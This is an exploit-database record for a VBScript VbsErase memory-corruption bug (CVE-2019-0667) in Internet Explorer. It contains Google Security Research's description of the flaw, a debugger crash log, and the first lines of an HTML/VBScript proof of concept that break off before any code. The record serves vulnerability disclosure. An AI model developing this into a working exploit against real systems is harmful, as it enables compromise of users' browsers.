{
    "text": "published_time: 2019-03-19 ， id: 39810 ， eid: 46568 ， cve: CVE-2019-0667 ， title: Microsoft VBScript - VbsErase Memory Corruption - Windows dos Exploit ， author: Google Security Research ， published_time: 2019-03-19 ， verified: Verified ， platform: Windows ， exploit_type: dos ， exploit_url: /download/46568 ， exploit_detail: <!--\r ， There is an issue in VBScript in the VbsErase function. In some cases (see the attached PoC), VbsErase fails to clear the argument variable properly, which can trivially lead to crafting a variable with the array type, but with a pointer controlled controlled by an attacker. This issue was most likely introduced in an attempt to fix a previously reported issue in VbsErase (\r ， Debug log (Note: this was tested on Windows 10 64-bit v1809 with the most recent patches applied):\r ， (25b4.efc): Access violation - code c0000005 (first chance)\r ， First chance exceptions are reported before any exception handling.\r ， This exception may be expected and handled.\r ， VBSCRIPT!VbsErase+0x5a:\r ， 6e0fc9fa 8b3e            mov     edi,dword ptr [esi]  ds:002b:13371337=????????\r ， 0:009:x86> r\r ， eax=0000600c ebx=05dc10dc ecx=00000000 edx=00000000 esi=13371337 edi=05c5ca44\r ， eip=6e0fc9fa esp=05c5ca28 ebp=05c5ca48 iopl=0         nv up ei pl zr na pe nc\r ， cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246\r ， VBSCRIPT!VbsErase+0x5a:\r ， 6e0fc9fa 8b3e            mov     edi,dword ptr [esi]  ds:002b:13371337=????????\r ， 0:009:x86> k\r ，  # ChildEBP RetAddr  \r ， 00 05c5ca48 6e0beac7 VBSCRIPT!VbsErase+0x5a\r ， 01 05c5ca64 6e0b9d64 VBSCRIPT!StaticEntryPoint::Call+0x37\r ， 02 05c5cb9c 6e0b8297 VBSCRIPT!CScriptRuntime::RunNoEH+0xc94\r ， 03 05c5cbec 6e0b81b5 VBSCRIPT!CScriptRuntime::Run+0xc7\r ， 04 05c5ccfc 6e0b354d VBSCRIPT!CScriptEntryPoint::Call+0xe5\r ， 05 05c5cd90 6e0ae175 VBSCRIPT!CSession::Execute+0x52d\r ， 06 05c5cdd8 6e0c0638 VBSCRIPT!COleScript::ExecutePendingScripts+0x14a\r ， 07 05c5ce6c 6e0c03e9 VBSCRIPT!COleScript::ParseScriptTextCore+0x24b\r ， 08 05c5ce98 7053ff31 VBSCRIPT!COleScript::ParseScriptText+0x29\r ， 09 05c5ced0 7053f847 MSHTML!CActiveScriptHolder::ParseScriptText+0x51\r ， 0a 05c5cf40 7053ee02 MSHTML!CScriptCollection::ParseScriptText+0x182\r ， 0b 05c5d02c 7053f50e MSHTML!CScriptData::CommitCode+0x312\r ， 0c 05c5d0a8 7053e35a MSHTML!CScriptData::Execute+0x1ba\r ， 0d 05c5d0c8 7053c526 MSHTML!CHtmScriptParseCtx::Execute+0xaa\r ， 0e 05c5d11c 70635a4c MSHTML!CHtmParseBase::Execute+0x186\r ， 0f 05c5d13c 70635319 MSHTML!CHtmPost::Broadcast+0x14c\r ， 10 05c5d264 7060b4dd MSHTML!CHtmPost::Exec+0x339\r ， 11 05c5d284 7060b3d6 MSHTML!CHtmPost::Run+0x3d\r ， 12 05c5d2a4 7060b368 MSHTML!PostManExecute+0x60\r ， 13 05c5d2b8 7060b2d9 MSHTML!PostManResume+0x6f\r ， 14 05c5d2e8 70596767 MSHTML!CHtmPost::OnDwnChanCallback+0x39\r ， 15 05c5d300 70637b9b MSHTML!CDwnChan::OnMethodCall+0x27\r ， 16 05c5d37c 706381b3 MSHTML!GlobalWndOnMethodCall+0x1cb\r ， 17 05c5d3cc 75dc635b MSHTML!GlobalWndProc+0x1f3\r ， 18 05c5d3f8 75db729c USER32!_InternalCallWinProc+0x2b\r ， 19 05c5d4dc 75db63db USER32!UserCallWinProcCheckWow+0x3ac\r ， 1a 05c5d550 75db61b0 USER32!DispatchMessageWorker+0x21b\r ， 1b 05c5d55c 71a41e05 USER32!DispatchMessageW+0x10\r ， 1c 05c5f6e0 71a413b3 IEFRAME!CTabWindow::_TabWindowThreadProc+0x435\r ， 1d 05c5f7a0 724bdf6c IEFRAME!LCIETab_ThreadProc+0x403\r ， 1e 05c5f7b8 715b24bd msIso!_IsoThreadProc_WrapperToReleaseScope+0x1c\r ， 1f 05c5f7f0 75fdfe09 IEShims!NS_CreateThread::AutomationIE_ThreadProc+0x8d\r ， 20 05c5f800 77ab662d KERNEL32!BaseThreadInitThunk+0x19\r ， 21 05c5f85c 77ab65fd ntdll_77a50000!__RtlUserThreadStart+0x2f\r ， 22 05c5f86c 00000000 ntdll_77a50000!_RtlUserThreadStart+0x1b\r ， -->\r ， <!-- saved from url=(0016) -->\r ， <meta http-equiv=\"x-ua-compatible\" content=\"IE=10\">\r ， <script type=\"text/vbscript\">\r ， Class"
}